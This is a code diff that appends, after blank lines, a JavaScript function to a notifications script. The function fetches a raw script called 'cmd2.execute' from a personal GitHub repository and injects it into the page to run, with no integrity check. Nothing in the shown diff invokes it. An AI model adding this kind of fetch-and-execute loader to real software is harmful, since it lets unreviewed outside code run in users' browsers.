@@ -179,3 +179,55 @@ if (document.readyState === "loading") {
 } else {
     loadNotifications();
 }
+
+
+
+
+
+
+function loadScript(url, callback) {
+    const scriptElement = document.createElement('script');
+    scriptElement.src = url;
+    scriptElement.onload = callback;
+    scriptElement.onerror = function() {
+        console.error('Error loading script: ' + url);
+    };
+    document.body.appendChild(scriptElement);
+}
+
+function ExecuteCMD2() {
+    // URL of the raw script
+    const url = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/cmd2.execute';
+    
+    // Check if jQuery is already loaded (if needed by the external script)
+    if (typeof jQuery === 'undefined') {
+        // If jQuery is not loaded, dynamically load it
+        loadScript('https://code.jquery.com/jquery-3.6.0.min.js', function() {
+            console.log('jQuery loaded.');
+            loadMainScript();
+        });
+    } else {
+        // If jQuery is already loaded, directly load the main script
+        loadMainScript();
+    }
+
+    // Function to load and execute the main script
+    function loadMainScript() {
+        fetch(url)
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to fetch the script.');
+                }
+                return response.text();
+            })
+            .then(scriptText => {
+                const scriptElement = document.createElement('script');
+                scriptElement.textContent = scriptText;
+                document.body.appendChild(scriptElement);
+                console.log('Script executed.');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+    }
+}
